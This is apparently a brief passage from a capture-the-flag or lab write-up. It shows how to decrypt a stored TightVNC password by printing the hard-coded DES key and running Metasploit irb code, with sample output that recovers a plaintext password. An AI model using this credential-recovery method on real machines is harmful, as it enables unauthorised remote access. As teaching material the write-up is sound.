If we do some research, we can find a [repository](https://github.com/frizb/PasswordDecrypts) about decrypting VNC passwords. VNC used a hard coded DES key in order to encrypt credentials among different products including TightVNC. Using Metasploit, we can easily decrypt the password.

```bash
fixedkey = "\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey
```

```bash
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07"
 => "\\u0017Rk\\u0006#NX\\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
 => "Secure!\\x00"
>> 
```